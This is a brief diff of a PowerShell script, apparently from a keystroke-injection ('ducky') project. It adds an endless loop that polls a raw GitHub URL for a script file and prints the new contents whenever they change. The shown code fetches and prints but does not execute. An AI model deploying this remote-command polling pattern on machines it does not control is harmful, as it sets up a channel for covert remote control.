@@ -1,1 +1,7 @@
 $previous = (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/http/script).content
+while($true){
+$current = (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/http/script).content
+if(-not ($current -clike $previous )){
+$previous = $current
+$current
+}}
